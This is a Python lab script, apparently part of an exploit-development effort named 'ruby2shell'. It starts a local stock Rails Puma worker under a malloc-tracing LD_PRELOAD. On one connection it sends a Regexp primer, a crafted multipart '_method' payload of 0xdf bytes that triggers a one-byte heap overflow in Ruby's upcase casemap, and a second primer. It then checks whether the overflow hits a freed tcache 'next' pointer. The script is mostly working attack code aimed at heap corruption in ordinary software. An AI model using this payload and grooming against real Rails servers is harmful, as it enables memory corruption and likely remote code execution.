#!/usr/bin/env python3
"""One-worker keep-alive measurement of the combined Regexp/casemap lane.

Benign /rails/info/notes Regexp POST, then the wire-only mixed27
_method.to_s.upcase one-byte overflow, then a second benign Regexp POST, all
on one HTTP connection to one stock Rails Puma worker. LD_PRELOAD only observes
malloc/free addresses; it never writes into the target process.

Pass condition: the overflow byte address (casemap buffer user pointer + its
malloc request size) equals a previously freed 0x20 chunk's user pointer
(the tcache `next` word) or lies within that word's eight bytes.
"""
from __future__ import annotations

import http.client
import json
import os
from pathlib import Path
import resource
import subprocess
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence"
APP = ROOT / "lab/build/rails-stock-app"
RUBY = ROOT / "lab/build/plain/ruby-3.4.12-plain/bin/ruby"
BOUNDARY = b"X2SMPBOUND"
PRIMER = "[[:^ascii:][^一]&&x]"


def no_core() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def note_body(tag: str) -> bytes:
    return urlencode({"_method": "GET", "tag": tag}).encode()


def method_body() -> bytes:
    payload = b"a" + b"\xdf" * 27
    part = (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="_method"\r\n'
        b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
        + payload + b"\r\n--" + BOUNDARY + b"--\r\n"
    )
    return part


def post(conn: http.client.HTTPConnection, path: str, body: bytes, ctype: str) -> int | str:
    try:
        conn.request("POST", path, body=body, headers={
            "Content-Type": ctype, "Content-Length": str(len(body)),
        })
        r = conn.getresponse()
        status = r.status
        r.read()
        return status
    except Exception as exc:
        return f"ERR {type(exc).__name__}: {exc}"


def main() -> int:
    port = int(os.environ.get("RUBY2SHELL_COMBINED_PORT", "4607"))
    tag = os.environ.get("RUBY2SHELL_COMBINED_TAG", "combined-keepalive-1")
    log_path = EV / f"{tag}.trace"
    pid_path = EV / f"{tag}.pid"
    arm_path = EV / f"{tag}.arm"
    EV.mkdir(parents=True, exist_ok=True)
    arm_path.unlink(missing_ok=True)
    log_path.unlink(missing_ok=True)

    env = os.environ.copy()
    env["RAILS_MAX_THREADS"] = "1"
    env["LD_PRELOAD"] = str(ROOT / "lab/preload/casemaptrace.so")
    env["CASMAPTRACE_ARM"] = str(arm_path)
    gem_path = ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
    env["GEM_PATH"] = str(gem_path) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
    command = [str(RUBY), str(APP / "bin/rails"), "server", "-b", "127.0.0.1",
               "-p", str(port), "--pid", str(pid_path)]

    result: dict[str, object] = {"tag": tag, "port": port}
    with log_path.open("wb") as log:
        proc = subprocess.Popen(command, cwd=ROOT, env=env, stdout=log,
                                stderr=subprocess.STDOUT, preexec_fn=no_core)
        try:
            ready = False
            for _ in range(300):
                if proc.poll() is not None:
                    break
                try:
                    probe = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
                    probe.request("GET", "/rails/info/notes")
                    probe.getresponse().read()
                    probe.close()
                    ready = True
                    break
                except OSError:
                    time.sleep(0.1)
            result["ready"] = ready
            if ready:
                arm_path.touch()
                time.sleep(0.2)
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=60)
                result["status_primer"] = post(
                    conn, "/rails/info/notes", note_body(PRIMER),
                    "application/x-www-form-urlencoded")
                result["status_attack"] = post(
                    conn, "/not-a-route", method_body(),
                    "multipart/form-data; boundary=" + BOUNDARY.decode())
                result["status_final"] = post(
                    conn, "/rails/info/notes", note_body(PRIMER),
                    "application/x-www-form-urlencoded")
                conn.close()
                time.sleep(0.2)
                result["exit"] = proc.poll()
        finally:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
            pid_path.unlink(missing_ok=True)
            arm_path.unlink(missing_ok=True)

    mallocs: list[tuple[int, int]] = []
    freed20: list[int] = []
    for line in log_path.read_bytes().splitlines():
        bits = line.split()
        if len(bits) == 4 and bits[0] == b"M":
            mallocs.append((int(bits[1], 16), int(bits[2])))
        elif len(bits) == 4 and bits[0] == b"F":
            freed20.append(int(bits[1], 16))
    casemap = [p for p, n in mallocs if 65 <= n <= 80]
    destinations = [p + n for p, n in mallocs if 65 <= n <= 80]
    matched = [d for d in destinations for p in freed20 if p <= d < p + 8]
    header_hits = [d for d in destinations for p in freed20 if p - 16 <= d < p]
    result.update({
        "malloc_40_160": len(mallocs),
        "casemap_buffer_candidates": len(casemap),
        "freed_0x20_chunks": len(freed20),
        "unique_freed_0x20": len(set(freed20)),
        "destinations": [hex(d) for d in destinations[:20]],
        "freed_addresses": [hex(p) for p in freed20[:20]],
        "tcache_next_word_matches": len(matched),
        "adjacent_header_hits": len(header_hits),
        "trace_bytes": log_path.stat().st_size,
    })
    out = EV / f"{tag}.json"
    out.write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))
    return 0 if result["ready"] is True else 1


if __name__ == "__main__":
    raise SystemExit(main())
